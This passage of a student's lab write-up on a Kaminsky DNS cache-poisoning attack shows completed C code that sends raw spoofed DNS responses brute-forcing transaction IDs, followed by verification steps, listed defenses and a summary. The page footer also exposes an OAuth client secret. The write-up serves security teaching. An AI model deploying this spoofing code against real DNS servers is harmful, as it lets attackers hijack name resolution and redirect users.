MAX_FILE_SIZE 1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">                     iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">                     iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address </span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span>   <span class="comment">//Destination IP address </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span class="type">int</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the DNS request packet from file</span></span><br><span class="line">  FILE * f_req = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_req) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_req[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_req = fread(ip_req, <span class="number">1</span>, MAX_FILE_SIZE, f_req);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the first DNS response packet from file</span></span><br><span class="line">  FILE * f_resp = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_resp) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_resp[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_resp = fread(ip_resp, <span class="number">1</span>, MAX_FILE_SIZE, f_resp);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">  <span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate a random name with length 5</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)  name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//##################################################################</span></span><br><span class="line">    <span class="comment">/* Step 1. Send a DNS request to the targeted local DNS server.</span></span><br><span class="line"><span class="comment">               This will trigger the DNS server to send out DNS queries */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... Students should add code here.</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// modify domain name</span></span><br><span class="line">      <span class="comment">// 发送随机的域名</span></span><br><span class="line">      ip_req[<span class="number">0x29</span>+i] = name[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send_dns_request(ip_req,n_req);</span><br><span class="line">    <span class="comment">/* Step 2. Send many spoofed responses to the targeted local DNS server,</span></span><br><span class="line"><span class="comment">               each one with a different transaction ID. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... Students should add code here.</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 将返回的域名改成发送的</span></span><br><span class="line">      ip_resp[<span class="number">0x29</span>+i] = name[i]; <span class="comment">// 为什么要修改两个值？因为回应的包里面既包含了query的内容，也包含了响应的，所以要修改两次。</span></span><br><span class="line">      ip_resp[<span class="number">0x40</span>+i] = name[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(time=<span class="number">0</span>;time&lt;<span class="number">10000</span>;time++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// modify trans, 2 bytes, change it at random</span></span><br><span class="line">      <span class="comment">// 爆破trans位置的信息, 一共2byte</span></span><br><span class="line">      ip_resp[<span class="number">0x1c</span>] = rand()%<span class="number">256</span>;</span><br><span class="line">      ip_resp[<span class="number">0x1d</span>] = rand()%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">      send_dns_response(ip_resp,n_resp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//##################################################################</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use for sending DNS request.</span></span><br><span class="line"><span class="comment"> * Add arguments to the function definition if needed.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Students need to implement this function</span></span><br><span class="line">  send_raw_packet(req,size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use for sending forged DNS response.</span></span><br><span class="line"><span class="comment"> * Add arguments to the function definition if needed.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *resp,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Students need to implement this function</span></span><br><span class="line">  send_raw_packet(resp,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Send the raw packet out </span></span><br><span class="line"><span class="comment"> *    buffer: to contain the entire IP packet, with everything filled out.</span></span><br><span class="line"><span class="comment"> *    pkt_size: the size of the buffer.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">	     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">  sendto(sock, buffer, pkt_size, <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">  close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220530214258861.png" alt="image-20220530214258861"></p>
+<h1 id="task6-verify"><a href="#task6-verify" class="headerlink" title="task6: verify"></a>task6: verify</h1><p>这里要做的是验证一下我们确实攻击成功了</p>
+<p><img src="/.io//image-20220530214529111.png" alt="image-20220530214529111"></p>
+<p>下面是直接dig attacker的服务器查询example.com的结果</p>
+<p><img src="/.io//image-20220530214632385.png" alt="image-20220530214632385"></p>
+<p>接下来尝试使用wireshark抓包来进一步确认。以下是在本地DNS中没有缓存时，访问<a target="_blank" rel="noopener" href="http://www.example.com的结果.可以看到最终是153结尾的attacker返回的结果.说明我们成功劫持了ip末尾为53的dns服务器的example.com的权威dns服务器缓存./">www.example.com的结果。可以看到最终是153结尾的attacker返回的结果。说明我们成功劫持了IP末尾为53的DNS服务器的example.com的权威DNS服务器缓存。</a></p>
+<p><img src="/.io//image-20220530222551632.png" alt="image-20220530222551632"></p>
+<p>下图是直接尝试访问attacker的DNS服务器。可以看到时一模一样的(除了第一个包里面可以看到是直接请求的attacker32的DNS，而上面那张图是example.com)也就是说，attacker现在可以完全控制example.com的DNS解析权。</p>
+<p><img src="/.io//image-20220530215753550.png" alt="image-20220530215753550"></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol>
+<li>增大transcationID取值范围，使之更难爆破</li>
+<li>随机化DNS端口号(其实相当于增大transcationID取值范围)</li>
+<li>对于每一个DNS请求，询问两次。这样敌手需要爆破32位。</li>
+<li>使用DNSSEC机制。(类似于公钥身份验证)</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上述实验中，完成了一次Kaminsky攻击。了解了DNS解析的缺陷以及Kaminsky攻击的优越特性：使得攻击只是时间问题。并且使用C语言编写的程序，大大加快爆破transID的速度，最终成功实践仅需要不到一分钟。</p>
+<p>最后，了解了一下如何防御DNS的攻击，主要还是让爆破变得更加困难，增加随机数取值的思路。最终结束了对于本学期软件安全的所有实验，受益良多。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/05/30/software-security-lab6/">software-security-lab6</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-05-30, 08:27:47</p>
+        <p><span>最后更新:</span>2023-01-19, 13:07:00</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/05/30/software-security-lab6/" title="software-security-lab6">https://nicholas-wei.github.io/2022/05/30/software-security-lab6/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/05/30/software-security-lab6/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/07/28/dice2022-hope/">
+                    dice2022@hope
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/05/18/software-security-lab5/">
+                    software-security-lab5
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#software-security-lab6"><span class="toc-number">1.</span> <span class="toc-text">software-security-lab6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">DNS攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">传统攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kaminsky%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Kaminsky攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">环境验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#task2-construct-DNS-request"><span class="toc-number">3.</span> <span class="toc-text">task2:construct DNS request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#task3-spoof-DNS-replies"><span class="toc-number">4.</span> <span class="toc-text">task3: spoof DNS replies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#task4-full-attack"><span class="toc-number">5.</span> <span class="toc-text">task4: full attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%8C%85"><span class="toc-number">5.1.</span> <span class="toc-text">构造包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8C%E4%BF%AE%E6%94%B9%E5%B9%B6%E5%8F%91%E9%80%81"><span class="toc-number">5.2.</span> <span class="toc-text">使用C修改并发送</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#task6-verify"><span class="toc-number">6.</span> <span class="toc-text">task6: verify</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"software-security-lab6　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/07/28/dice2022-hope/" title="上一篇: dice2022@hope">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/05/18/software-security-lab5/" title="下一篇: software-security-lab5">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
